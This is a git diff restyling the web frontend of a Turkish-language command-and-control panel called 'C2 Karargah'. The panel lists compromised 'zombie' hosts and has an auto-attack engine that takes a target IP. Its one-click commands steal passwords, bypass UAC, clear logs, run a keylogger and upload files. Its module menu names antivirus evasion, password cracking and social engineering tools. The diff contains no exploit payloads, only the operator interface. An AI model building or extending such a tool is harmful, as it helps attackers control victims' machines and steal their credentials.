@@ -9,6 +9,9 @@
 <body>
     <header class="glass-panel">
         <div class="logo">
+            <div class="logo-icon">
+                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
+            </div>
             <h1>C2 <span>Karargah</span></h1>
         </div>
         <div class="status-bar">
@@ -17,7 +20,7 @@
                 <span id="status-text">Dinleyici Kapalı</span>
             </div>
             <div class="status-badge">
-                Zombi Sayısı: <strong id="zombi-count" style="color:var(--primary)">0</strong>
+                Zombiler: <strong id="zombi-count" style="color:var(--secondary); font-family:'Fira Code'; margin-left:8px;">0</strong>
             </div>
         </div>
     </header>
@@ -25,25 +28,32 @@
     <div class="dashboard-grid">
         <!-- Sidebar -->
         <div class="sidebar glass-panel">
-            <h2>Hızlı İşlemler</h2>
-            
-            <div class="input-group">
-                <input type="number" id="listen-port" value="443" placeholder="Port">
-                <button class="btn btn-primary" onclick="startListener()">Dinle</button>
+            <div class="sidebar-section">
+                <h2>Hızlı İşlemler</h2>
+                <div class="input-group" style="margin-bottom: 10px;">
+                    <input type="number" id="listen-port" value="443" placeholder="Port">
+                    <button class="btn btn-primary" onclick="startListener()">Dinle</button>
+                </div>
             </div>
 
-            <h2>Oto-Pwn Motoru</h2>
-            <div class="input-group">
-                <input type="text" id="target-ip" placeholder="Hedef IP">
-                <button class="btn btn-primary" onclick="startAutoPwn()">Saldır</button>
+            <div class="sidebar-section">
+                <h2>Oto-Pwn Motoru</h2>
+                <div class="input-group">
+                    <input type="text" id="target-ip" placeholder="Hedef IP (Örn: 192.168.1.5)">
+                    <button class="btn btn-primary" onclick="startAutoPwn()">Saldır</button>
+                </div>
             </div>
 
-            <h2>Kategoriler</h2>
-            <button class="btn" onclick="logMsg('Lütfen bu araçları terminaldeki C2_Karargah.py menüsünden kullanın. Web üzerinden C2 kontrolü aktiftir.')">01_Antivirus_Atlatma</button>
-            <button class="btn" onclick="logMsg('Terminalden kullanın.')">04_Ag_Kesif_Araclari</button>
-            <button class="btn" onclick="logMsg('Terminalden kullanın.')">06_Sifre_Kirici</button>
-            <button class="btn" onclick="logMsg('Terminalden kullanın.')">10_Sosyal_Muhendislik</button>
-            <button class="btn" onclick="logMsg('Terminalden kullanın.')">12_Web_Zafiyet</button>
+            <div class="sidebar-section">
+                <h2>Sistem Modülleri</h2>
+                <div class="menu-list">
+                    <button class="btn" onclick="logMsg('Terminaldeki C2_Karargah.py menüsünden başlatın.')">01_Antivirus_Atlatma</button>
+                    <button class="btn" onclick="logMsg('Terminalden başlatın.')">04_Ag_Kesif_Araclari</button>
+                    <button class="btn" onclick="logMsg('Terminalden başlatın.')">06_Sifre_Kirici</button>
+                    <button class="btn" onclick="logMsg('Terminalden başlatın.')">10_Sosyal_Muhendislik</button>
+                    <button class="btn" onclick="logMsg('Terminalden başlatın.')">12_Web_Zafiyet</button>
+                </div>
+            </div>
         </div>
 
         <!-- Main Area -->
@@ -51,36 +61,42 @@
             
             <!-- Zombiler -->
             <div class="glass-panel zombi-list" id="zombi-list-container">
-                <h2 style="color:var(--secondary); font-family:'Orbitron'; margin-bottom:15px;">Aktif Bağlantılar (Zombiler)</h2>
+                <div class="zombi-list-header">
+                    <h2>AKTİF BAĞLANTILAR</h2>
+                </div>
                 <div id="zombi-list">
-                    <p style="color:#666">Henüz bağlantı yok...</p>
+                    <p style="color:var(--text-muted); font-family:'Fira Code';">Sinyal bekleniyor...</p>
                 </div>
             </div>
 
             <!-- Terminal -->
             <div class="glass-panel terminal-container">
                 <div class="terminal-header">
-                    <span class="terminal-title" id="term-title">Web Terminali - Bağlantı Seçilmedi</span>
-                    <button class="cmd-btn" style="border-color:red; color:red;" onclick="sendCommand('!PANIK')">☠️ PANİK (Kill-Switch)</button>
+                    <span class="terminal-title" id="term-title">Bağlantı Bekleniyor</span>
+                    <button class="cmd-btn danger" onclick="sendCommand('!PANIK')">☠️ PANİK (Kill-Switch)</button>
                 </div>
-                <div class="terminal-output" id="terminal-output">C2 Karargah Web Arayüzüne Hoş Geldiniz...
-Bir zombi seçin ve komut göndermeye başlayın.</div>
                 
-                <div class="quick-commands">
-                    <button class="cmd-btn" onclick="sendCommand('whoami')">whoami</button>
-                    <button class="cmd-btn" onclick="sendCommand('sysinfo')">sysinfo</button>
-                    <button class="cmd-btn" onclick="sendCommand('!screenshot')">📸 Screenshot</button>
-                    <button class="cmd-btn" onclick="sendCommand('!steal_passwords')">🔑 Şifreleri Çal</button>
-                    <button class="cmd-btn" onclick="sendCommand('!getsystem')">👑 UAC Bypass</button>
-                    <button class="cmd-btn" onclick="sendCommand('!clear_logs')">🧹 İzleri Sil</button>
-                    <button class="cmd-btn" onclick="sendCommand('!keylog_start')">⌨️ Keylogger Başlat</button>
-                    <button class="cmd-btn" onclick="sendCommand('!keylog_dump')">⌨️ Keylog Oku</button>
-                </div>
+                <div class="terminal-output" id="terminal-output">C2 Karargah Merkezi Sistemlerine Bağlanıldı.
+[!] Uçtan uca şifreleme (E2EE) devrede.
+[!] Bir kurban seçin ve komut göndermeye başlayın.</div>
+                
+                <div class="terminal-controls">
+                    <div class="quick-commands">
+                        <button class="cmd-btn" onclick="sendCommand('whoami')">whoami</button>
+                        <button class="cmd-btn" onclick="sendCommand('sysinfo')">sysinfo</button>
+                        <button class="cmd-btn" onclick="sendCommand('!screenshot')">📸 Screenshot</button>
+                        <button class="cmd-btn" onclick="sendCommand('!steal_passwords')">🔑 Şifreleri Çal</button>
+                        <button class="cmd-btn" onclick="sendCommand('!getsystem')">👑 UAC Bypass</button>
+                        <button class="cmd-btn" onclick="sendCommand('!clear_logs')">🧹 İzleri Sil</button>
+                        <button class="cmd-btn" onclick="sendCommand('!keylog_start')">⌨️ Keylogger Başlat</button>
+                        <button class="cmd-btn" onclick="sendCommand('!keylog_dump')">⌨️ Keylog Oku</button>
+                    </div>
 
-                <div class="terminal-input-wrapper" style="margin-top:15px;">
-                    <span style="color:var(--primary); padding:10px 0;">C2></span>
-                    <input type="text" id="term-input" class="terminal-input" placeholder="Komut yazın... (!upload dosya.exe | !download dosya.txt)" onkeypress="handleEnter(event)">
-                    <button class="btn btn-primary" style="width:100px" onclick="sendInputCmd()">Gönder</button>
+                    <div class="terminal-input-wrapper">
+                        <span class="prompt">C2></span>
+                        <input type="text" id="term-input" class="terminal-input" placeholder="Sistem komutu girin..." onkeypress="handleEnter(event)">
+                        <button class="btn btn-primary" style="width:100px; padding: 8px 15px;" onclick="sendInputCmd()">Çalıştır</button>
+                    </div>
                 </div>
             </div>
 
@@ -92,7 +108,7 @@ Bir zombi seçin ve komut göndermeye başlayın.</div>
 
         function logMsg(msg, isErr=false) {
             const out = document.getElementById('terminal-output');
-            const color = isErr ? 'red' : '#0f0';
+            const color = isErr ? '#ff0055' : 'var(--success)';
             out.innerHTML += `\n<span style="color:${color}">${msg}</span>`;
             out.scrollTop = out.scrollHeight;
         }
@@ -109,7 +125,7 @@ Bir zombi seçin ve komut göndermeye başlayın.</div>
                 const data = await res.json();
                 if(data.status === 'success') {
                     document.getElementById('status-indicator').className = 'indicator active';
-                    document.getElementById('status-text').innerText = `Dinleniyor (${port})`;
+                    document.getElementById('status-text').innerText = `Sistem Aktif (${port})`;
                     logMsg(`[+] ${data.message}`);
                 } else {
                     logMsg(`[-] Hata: ${data.message}`, true);
@@ -120,7 +136,7 @@ Bir zombi seçin ve komut göndermeye başlayın.</div>
         async function startAutoPwn() {
             const ip = document.getElementById('target-ip').value;
             if(!ip) return alert('Hedef IP girin!');
-            logMsg(`[*] Auto-Pwn ${ip} için başlatıldı. Arka planda çalışıyor...`);
+            logMsg(`[*] Otopilot motoru ateşlendi. Hedef: ${ip}`);
             try {
                 await fetch('/api/autopwn', {
                     method: 'POST',
@@ -138,17 +154,17 @@ Bir zombi seçin ve komut göndermeye başlayın.</div>
                 document.getElementById('zombi-count').innerText = data.sessions.length;
                 
                 if(data.sessions.length === 0) {
-                    list.innerHTML = '<p style="color:#666">Henüz bağlantı yok...</p>';
+                    list.innerHTML = '<p style="color:var(--text-muted); font-family:\'Fira Code\';">Sinyal bekleniyor...</p>';
                 } else {
                     let html = '';
                     data.sessions.forEach(s => {
                         html += `
                             <div class="zombi-card">
-                                <div>
-                                    <strong style="color:#fff">ID: ${s.id}</strong><br>
-                                    <span style="color:#888; font-size:0.8rem">${s.ip}:${s.port}</span>
+                                <div class="zombi-info">
+                                    <strong>ZOMBI-${s.id}</strong>
+                                    <span>${s.ip}:${s.port}</span>
                                 </div>
-                                <button class="btn" style="width:auto; padding:5px 15px; border-color:var(--secondary)" onclick="selectSession(${s.id}, '${s.ip}')">Bağlan</button>
+                                <button class="btn" onclick="selectSession(${s.id}, '${s.ip}')">Erişim Sağla</button>
                             </div>
                         `;
                     });
@@ -159,16 +175,16 @@ Bir zombi seçin ve komut göndermeye başlayın.</div>
 
         function selectSession(id, ip) {
             currentSession = id;
-            document.getElementById('term-title').innerText = `Web Terminali - Zombi [${id}] (${ip})`;
-            logMsg(`\n[+] Zombi ${id} seçildi. Komut göndermeye hazır.`);
+            document.getElementById('term-title').innerText = `Zombi [${id}] - ${ip}`;
+            logMsg(`\n[+] C2 bağlantısı kuruldu. Hedef: Zombi-${id}`);
         }
 
         async function sendCommand(cmd) {
             if(currentSession === null) {
-                logMsg(`[-] Önce sol menüden bir Zombi seçin.`, true);
+                logMsg(`[-] Komut reddedildi: Önce bir hedef sistem seçin.`, true);
                 return;
             }
-            logMsg(`\nZombi-${currentSession}> ${cmd}`, false);
+            logMsg(`\n<span style="color:var(--secondary)">Zombi-${currentSession}></span> ${cmd}`, false);
             
             try {
                 const res = await fetch('/api/command', {
@@ -183,11 +199,11 @@ Bir zombi seçin ve komut göndermeye başlayın.</div>
                     logMsg(data.message, true);
                     if(data.message.includes('koptu') || data.message.includes('kesildi')) {
                         currentSession = null;
-                        document.getElementById('term-title').innerText = `Web Terminali - Bağlantı Yok`;
+                        document.getElementById('term-title').innerText = `Bağlantı Kesildi`;
                     }
                 }
             } catch(e) {
-                logMsg(`[-] İletişim Hatası: ${e}`, true);
+                logMsg(`[-] Sinyal Hatası: ${e}`, true);
             }
             updateSessions();
         }
@@ -205,7 +221,6 @@ Bir zombi seçin ve komut göndermeye başlayın.</div>
             }
         }
 
-        // Poll sessions every 3 seconds
         setInterval(updateSessions, 3000);
         updateSessions();
     </script>
